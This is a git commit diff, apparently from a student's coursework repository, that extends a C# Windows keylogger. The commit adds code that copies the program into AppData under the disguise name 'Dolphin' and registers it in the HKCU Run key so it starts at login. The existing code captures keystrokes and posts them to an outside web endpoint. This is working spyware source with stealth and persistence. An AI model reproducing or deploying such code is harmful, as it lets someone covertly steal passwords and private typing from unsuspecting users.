cff0314b1cb11aab36ad266ab98e47fa492a95de
Федор Юрецкий <fedjaz5@gmail.com>
2020-04-01 18:06:31 +0300

    now adds itself to startup and hides steps

--- 2 term/PT/fourth/Keylogger(task1)/Keylogger/Program.cs
+++ 2 term/PT/fourth/Keylogger(task1)/Keylogger/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Threading;
@@ -6,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using Microsoft.Win32;
 
 namespace Keylogger
 {
@@ -16,25 +18,70 @@ namespace Keylogger
         {
             //-------------------------------------------------------//
 
-            bool EnableConsoleOutput = true;
-            //If you want console to become invisible, go to project -> properties ->
-            //application and set output type to windows application
+            bool enableConsoleOutput = true;
+            //If you want console to become invisible, go to project ->
+            //properties -> application and set output type to windows application
 
             string URL = @"https://ptsv2.com/t/l0l8k-1585687144/post";
             //You can set link of rest api service, that accepts post requsts.
             //By default, it's free debug service for accepting post request.
-            //Results could be seen here: https://ptsv2.com/t/l0l8k-1585687144
+            //Results can be vieved here: https://ptsv2.com/t/l0l8k-1585687144
+
+            bool hideExecutable = true;
+            string appTitle = "Dolphin";
+            string path = String.Format(@"C:\Users\{0}\AppData\Roaming\", 
+                                        Environment.UserName);
+            //During the first launch, program can hide itself to a
+            //specified path
+
+            bool placeToStartup = true;
+            //During the first launch, program can place itself to a
+            //startup register
 
             //-------------------------------------------------------//
 
+            bool replaced = false;
+            if(hideExecutable && path != Application.ExecutablePath)
+            {
+                try
+                {
+                    if(!File.Exists(path + appTitle + ".exe"))
+                    {
+                        File.Move(Application.ExecutablePath, path + appTitle + ".exe");
+                    }
+                    replaced = true;
+                    
+                }
+                catch { }
+            }
+            if(placeToStartup)
+            {
+                string pathToPlace = "";
+                if(!hideExecutable)
+                {
+                    pathToPlace = Application.ExecutablePath;
+                }
+                else if(replaced)
+                {
+                    pathToPlace = path + appTitle + ".exe";
+                }
+                if(pathToPlace != "")
+                {
+                    RegistryKey key = Registry.CurrentUser.OpenSubKey
+                        (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                    if(!pathToPlace.Equals(key.GetValue(appTitle)))
+                    {
+                        key.SetValue(appTitle, pathToPlace);
+                    }
+                }
+            }
+
             Catcher catcher = new Catcher(20);
-            Logger logger = new Logger(URL, EnableConsoleOutput);
+            Logger logger = new Logger(URL, enableConsoleOutput);
             catcher.KeyDown += logger.KeyDown;
             catcher.KeyUp += logger.KeyUp;
             catcher.Start();           
             waitHandle.WaitOne();
         }
-
-        
     }
 }
